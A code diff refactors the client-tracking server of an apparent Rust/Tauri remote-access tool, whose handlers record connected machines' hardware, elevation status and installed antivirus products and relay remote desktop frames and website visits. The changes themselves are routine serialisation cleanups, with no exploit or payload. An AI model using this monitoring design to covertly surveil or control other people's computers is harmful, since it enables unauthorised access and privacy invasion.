@@ -97,11 +97,9 @@ impl ServerWrapper {
         Ok(())
     }
     
-    async fn emit_client_status(&self, username: &str, addr: &SocketAddr, status: &str) {
-        self.emit_serde_payload(status, serde_json::json!({
-            "username": username.to_string(),
-            "addr": addr.to_string()
-        })).await;
+    async fn emit_client_status(&self, client_info: &ClientInfo, status: &str) {
+        let payload = serde_json::json!(client_info);
+        self.emit_serde_payload(status, payload).await;
     }
 
     async fn emit_serde_payload(&self, event: &str, payload: serde_json::Value) {
@@ -196,14 +194,17 @@ impl ServerWrapper {
                             .unwrap();
                     }
                 }
-                RegisterClient(tx, addr, client_info) => {                    // Store the client's connection sender
+                RegisterClient(tx, addr, mut client_info) => {                    // Store the client's connection sender
                     self.txs.insert(addr, tx);
+                    client_info.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
+                    client_info.addr = Some(addr.to_string());
+
                     self.connected_users.insert(addr, client_info.clone());
                     
                     let message = format!("Client [{}] {} connected!", addr, client_info.username);
 
                     self.log_events.log("client_connected", &message).await;
-                    self.emit_client_status(&client_info.username, &addr, "client_connected").await;
+                    self.emit_client_status(&client_info, "client_connected").await;
                 }
                 VisitWebsite(addr, visit_data) => {
                     let client = self.connected_users.get(&addr).unwrap();
@@ -358,52 +359,12 @@ impl ServerWrapper {
                     self.emit_serde_payload("remote_desktop_frame", payload).await;
                 }
                 GetClients(resp) => {
-                    let mut clients = Vec::new();
-                    
-                    for (addr, client_info) in self.connected_users.iter() {
-                        clients.push(crate::handlers::FrontClient {
-                            group: client_info.group.clone(),
-                            addr: addr.clone(),
-                            username: client_info.username.clone(),
-                            hostname: client_info.hostname.clone(),
-                            os: client_info.os.clone(),
-                            ram: client_info.ram.clone(),
-                            cpu: client_info.cpu.clone(),
-                            gpus: client_info.gpus.clone(),
-                            storage: client_info.storage.clone(),
-                            displays: client_info.displays,
-                            ip: addr.to_string(),
-                            disconnected: !self.txs.contains_key(addr),
-                            is_elevated: client_info.is_elevated,
-                            installed_avs: client_info.installed_avs.clone(),
-                        });
-                    }
-                    
+                    let clients = self.connected_users.values().cloned().collect();
                     resp.send(clients).ok();
                 }
                 GetClient(addr, resp) => {
-                    if let Some(client_info) = self.connected_users.get(&addr) {
-                        let front_client = crate::handlers::FrontClient {
-                            group: client_info.group.clone(),
-                            addr: addr.clone(),
-                            username: client_info.username.clone(),
-                            hostname: client_info.hostname.clone(),
-                            os: client_info.os.clone(),
-                            ram: client_info.ram.clone(),
-                            cpu: client_info.cpu.clone(),
-                            gpus: client_info.gpus.clone(),
-                            storage: client_info.storage.clone(),
-                            displays: client_info.displays,
-                            ip: addr.to_string(),
-                            disconnected: !self.txs.contains_key(&addr),
-                            is_elevated: client_info.is_elevated,
-                            installed_avs: client_info.installed_avs.clone(),
-                        };
-                        
-                        resp.send(Some(front_client)).ok();
-                    } else {
-                        resp.send(None).ok();
-                    }
+                   let client = self.connected_users.get(&addr).cloned();
+                   resp.send(client).ok();
                 }
                 SetTauriHandle(handle) => {
                     self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
@@ -413,7 +374,7 @@ impl ServerWrapper {
                     if let Some(client) = self.connected_users.get(&addr) {
                         let message = format!("Client [{}] [{}] disconnected", addr, client.username);
                         self.log_events.log("client_disconnected", &message).await;
-                        self.emit_client_status(&client.username, &addr, "client_disconnected").await;
+                        self.emit_client_status(&client, "client_disconnected").await;
                     }
 
                     self.txs.remove(&addr);
